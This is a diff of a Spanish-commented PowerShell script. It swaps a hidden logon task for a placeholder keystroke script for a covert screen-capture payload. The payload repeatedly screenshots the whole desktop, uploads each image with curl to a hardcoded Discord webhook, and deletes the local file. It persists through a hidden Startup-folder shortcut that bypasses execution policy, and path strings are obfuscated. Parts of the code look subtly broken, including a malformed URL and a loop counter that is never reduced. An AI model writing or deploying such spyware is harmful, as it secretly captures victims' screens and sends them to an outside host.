@@ -7,72 +7,51 @@ if (-not $isAdmin) {
     exit
 }
 
-# Ruta predeterminada donde se guardará el script
-$ScriptDirectory = "$env:USERPROFILE\Documents\.\." + [char]92 + "AppData" + [char]92 + "Local" + [char]92 + "Temp" + [char]92 + "Data"
+# Ruta del script de captura de pantalla
+$ScriptPath = "$env:USERPROFILE\Documents\.\." + [char]92 + "AppData" + [char]92 + "Local" + [char]92 + "Temp" + [char]92 + "screenshot_script.ps1"
 
-# Crear el directorio si no existe
-if (-not (Test-Path -Path $ScriptDirectory -PathType Container)) {
-    New-Item -Path $ScriptDirectory -ItemType Directory
+# Contenido del script de captura de pantalla
+$ScriptContent = @"
+\$hookurl = "Uhttps://discord.com/api/webhooks/1203343432970539008/JjFQGyK8MZw2qySfc4jYTPw0jzsH2HKaKAaaQ27uyrllfMIVaDqEUi_ZywclJBmWpxJp"
+\$seconds = 30 # Intervalo de captura de pantalla
+\$a = 2 # Cantidad de capturas de pantalla
+
+# Detección de URL acortada
+if (\$hookurl.Ln -ne 121) {
+    Write-Host "¡Se detectó una URL de webhook acortada!"
+    \$hookurl = (irm \$hookurl).url
 }
 
-# Guardar el script de detección de pulsaciones de teclas en la ruta predeterminada
-$ScriptPath = Join-Path -Path $ScriptDirectory -ChildPath "keystroke_script.ps1"
-@"
-# Aquí va tu script de detección de pulsaciones de teclas
-"@ | Set-Content -Path $ScriptPath
-
-# Crear un nuevo archivo XML con la definición de la tarea programada
-$TaskXml = @"
-<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <RegistrationInfo>
-    <Date>2024-02-09T00:00:00</Date>
-    <Author>Usuario</Author>
-    <Description>Ejecutar script de detección de pulsaciones de teclas al iniciar sesión en Windows.</Description>
-  </RegistrationInfo>
-  <Triggers>
-    <LogonTrigger>
-      <Enabled>true</Enabled>
-    </LogonTrigger>
-  </Triggers>
-  <Settings>
-    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
-    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
-    <AllowHardTerminate>true</AllowHardTerminate>
-    <StartWhenAvailable>false</StartWhenAvailable>
-    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
-    <IdleSettings>
-      <StopOnIdleEnd>true</StopOnIdleEnd>
-      <RestartOnIdle>false</RestartOnIdle>
-    </IdleSettings>
-    <AllowStartOnDemand>true</AllowStartOnDemand>
-    <Enabled>true</Enabled>
-    <Hidden>true</Hidden>
-    <RunOnlyIfIdle>false</RunOnlyIfIdle>
-    <WakeToRun>false</WakeToRun>
-    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
-    <Priority>7</Priority>
-  </Settings>
-  <Actions Context="Author">
-    <Exec>
-      <Command>powershell.exe</Command>
-      <Arguments>-NoProfile -ExecutionPolicy Bypass -File "$ScriptPath"</Arguments>
-    </Exec>
-  </Actions>
-</Task>
+While (\$a -gt 0) {
+    \$Filett = "\$env:temp\SC.png"
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-type -AssemblyName System.Drawing
+    \$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+    \$Width = \$Screen.Width
+    \$Height = \$Screen.Height
+    \$Left = \$Screen.Left
+    \$Top = \$Screen.Top
+    \$bitmap = New-Object System.Drawing.Bitmap \$Width, \$Height
+    \$graphic = [System.Drawing.Graphics]::FromImage(\$bitmap)
+    \$graphic.CopyFromScreen(\$Left, \$Top, 0, 0, \$bitmap.Size)
+    \$bitmap.Save(\$Filett, [System.Drawing.Imaging.ImageFormat]::png)
+    Start-Sleep 1
+    curl.exe -F "file1=@\$Filett" \$hookurl
+    Start-Sleep 1
+    Remove-Item -Path \$Filett
+    Start-Sleep \$seconds
+    \$a
+}
 "@
 
-# Registrar la tarea programada elevada
-$TaskXml | Out-File -FilePath "$env:USERPROFILE\Documents\.\." + [char]92 + "AppData" + [char]92 + "Local" + [char]92 + "Temp" + [char]92 + "Data\KeystrokeDetection.xml"
-$TaskPath = "$env:USERPROFILE\Documents\.\." + [char]92 + "AppData" + [char]92 + "Local" + [char]92 + "Temp" + [char]92 + "Data\KeystrokeDetection.xml"
-$TaskName = "KeystrokeDetection"
-$TaskService = New-Object -ComObject "Schedule.Service"
-$TaskService.Connect()
-$TaskFolder = $TaskService.GetFolder("\")
-$TaskDefinition = $TaskService.NewTask(0)
-$TaskDefinition.XmlText = (Get-Content -Path $TaskPath)
-$TaskFolder.RegisterTaskDefinition($TaskName, $TaskDefinition, 6, $null, $null, 3)
+# Guardar el script de captura de pantalla en la ruta especificada
+$ScriptContent | Out-File -FilePath $ScriptPath -Encoding utf8
 
-# Ejecutar la tarea programada
-$TaskService.GetFolder("\").GetTask($TaskName).Run($null)
+# Ruta del acceso directo en la carpeta de inicio de Windows
+$ShortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\screenshot_script.lnk"
+
+# Crear acceso directo para ejecutar el script de captura de pantalla al iniciar sesión
+$Shortcut = (New-Object -ComObject WScript.Shell).CreateShortcut($ShortcutPath)
+$Shortcut.TargetPath = "powershell.exe"
+$Shortcut.Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$ScriptPath"""
+$Shortcut.Save()
